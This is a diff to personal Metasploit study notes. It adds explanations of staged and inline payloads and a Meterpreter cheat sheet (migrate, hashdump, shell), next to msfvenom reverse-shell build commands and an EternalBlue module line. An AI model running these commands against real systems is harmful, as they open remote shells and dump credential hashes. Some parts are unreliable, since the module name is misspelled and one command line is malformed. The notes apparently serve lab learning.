@@ -28,8 +28,12 @@ use exploit/windows/smb/ms17_0010_eternalblue
 # dynamic search command
 ```
 
-
 - The `scanner/discovery/udp_sweep` module will allow you to quickly identify services running over the UDP (User Datagram Protocol).
+
+### Payloads
+There are two types of payloads
+- Staged are sent to the target in two steps, an initial part is installed (stager) adn the requests the rest of the payload => Allows smaller initial size
+- Inline payloads are sent in a single step
 ### Workspaces
 Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values.
 
@@ -75,5 +79,25 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf 
 # windows executable
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
 
+
+```
+
+
+### Meterpreter
+Is a C2 payload/agent that is cross compatible with multiple operating systems. It runs completely on memory and does not write anything to the disk
+It uses a TLS **encrypted** communication channel to avoid IDS/IPD detection 
+
+
+```bash
+# meterpreter payloads/types
+# load meterpreter payloads
+msfvenom --list payloads | grep meterpreter
+
+# get current user id
+meterpreter > getuid || ps || 
+meterpreter > migrate <PID> # process hijack
+meterpreter > hashdump # dumps SAM database (Security Account Manager)
+meterpreter > search -f <FILE_NAME>
+meterpreter > shell # launches regular shell on target 
 
 ```
